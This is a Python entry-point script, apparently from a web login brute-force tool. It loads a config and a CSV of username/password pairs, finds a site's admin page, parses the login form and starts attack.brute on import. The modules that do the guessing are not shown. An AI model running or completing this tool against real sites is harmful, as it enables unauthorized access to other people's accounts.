from datetime import datetime
import attack
import WebInfo
import pandas
import webParser
import logging
import sys
import json
import yaml

class LoginBrute:
    def __init__(self):
    
        logging.basicConfig(
            filename="logs/" + datetime.now().strftime("%d-%m-%Y %H-%M") + ".log",
            filemode="w",
            level=logging.INFO,
        )

        try:

            with open("config.yml", "r") as ymlfile:
                args = yaml.safe_load(ymlfile)

            # Opening params JSON file
            f = open(args["params_list"])
            params_list = json.load(f)

            pass_user = pandas.read_csv(args["pass_user"])

        except IOError as e:
            logging.error(e)
            sys.exit()
            
        url = args['headers']['Referer']
        args["url"] = WebInfo.get_admin_page(url)
        args["type"] = "javascript"  #

        # remove content length and cookies from headers
        if 'Cookie' in args['headers']:
            args['headers'].pop('Cookie')
            
        if 'Content-Length' in args['headers']:
            args['headers'].pop('Content-Length')
        
        args = webParser.get_source(args, params_list)

        args.update(pass_user)

        logging.info(json.dumps(args, indent=2, default=str))

        attack.brute(args)


LoginBrute()
